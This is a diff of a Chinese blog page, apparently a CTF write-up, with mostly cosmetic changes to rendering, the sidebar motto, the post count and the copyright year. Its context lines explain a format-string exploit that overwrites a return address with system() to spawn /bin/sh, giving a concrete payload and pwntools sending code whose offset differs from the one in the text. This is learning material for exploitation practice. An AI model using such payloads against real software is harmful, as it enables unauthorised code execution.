@@ -380,7 +380,7 @@
 <li>先把<code>/bin/sh</code>的地址放到栈上，再利用gadget把地址pop到rdi寄存器中，然后ret到<code>system</code>的地址。</li>
 <li>获取ret执行时rdi存放的地址，直接放这个地址里面写入<code>/bin/sh</code>（或者<code>sh</code>也行）</li>
 </ol>
-<p>我们先来尝试第一种方法，首先观察第一次ret时候栈上的分布是怎样的。程序的用户名和密码都有上限为20的长度限制，于是我们通过把用户名密码都设为<code>1234567890abcdef123\n</code>便于观察栈的分布。<br><img src="http://7j1yti.com1.z0.glb.clouddn.com/1467593479609.png" alt="Alt text"><span class="image-caption">Alt text</span><br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">8</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">9</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">10</span></span><br><span class="line"><span class="comment">user:</span> <span class="comment">|</span> <span class="comment">12345678</span> <span class="comment">|</span> <span class="comment">90abcdef</span> <span class="comment">|</span> <span class="comment">123\n</span></span><br><span class="line"><span class="comment"></span>      <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">11</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span> <span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="comment">12</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span></span><br><span class="line"><span class="comment">pass:</span> <span class="comment">1234</span> <span class="comment">|</span> <span class="comment">567890ab</span> <span class="comment">|</span> <span class="comment">cdef123\n</span> <span class="comment">|</span></span><br></pre></td></tr></table></figure></p>
+<p>我们先来尝试第一种方法，首先观察第一次ret时候栈上的分布是怎样的。程序的用户名和密码都有上限为20的长度限制，于是我们通过把用户名密码都设为<code>1234567890abcdef123\n</code>便于观察栈的分布。<br><img src="http://7j1yti.com1.z0.glb.clouddn.com/1467593479609.png" alt="Alt text"><span class="image-caption">Alt text</span><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">      -----8----- -----9---- ---10</span><br><span class="line">user: | 12345678 | 90abcdef | 123\n</span><br><span class="line">      ----- ----11---- ----12-----</span><br><span class="line">pass: 1234 | 567890ab | cdef123\n |</span><br></pre></td></tr></table></figure></p>
 <p>输入内容的位置和偏移位置的对应关系如上图所示，我们要往<code>0x7fffffffdd08</code>里面写入<code>0x400768</code>(<code>system</code>地址)，就可以构造出这样的payload：<br>user:<code>%4196120x%11$n</code><br>pass:<code>JUNK\x08\xdd\xff\xff\xff\x7f</code><br>给出相应的脚本代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">   p.sendline(<span class="string">"%4196200x%11$n"</span>)</span><br><span class="line">   p.sendline(<span class="string">'JUNK'</span> + p64(stack_ret))</span><br></pre></td></tr></table></figure></p>
 <blockquote>
 <p>小提示：编写脚本时想要用gdb调试程序，可以在相应位置加入<code>gdb.attach(p)</code>语句，pwntools为自动为我们连接到gdb进行调试。</p>
@@ -510,14 +510,14 @@
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
           <p class="site-author-name" itemprop="name">Matthew Shao</p>
-          <p class="site-description motion-element" itemprop="description">做人不能太攀比 踏踏实实做自己</p>
+          <p class="site-description motion-element" itemprop="description">坐中使气如秦侠 陌上行歌类楚狂</p>
         </div>
         <nav class="site-state motion-element">
         
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">61</span>
+                <span class="site-state-item-count">62</span>
                 <span class="site-state-item-name">文章</span>
               </a>
             </div>
@@ -602,7 +602,7 @@
         <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2020</span>
+  <span itemprop="copyrightYear">2021</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
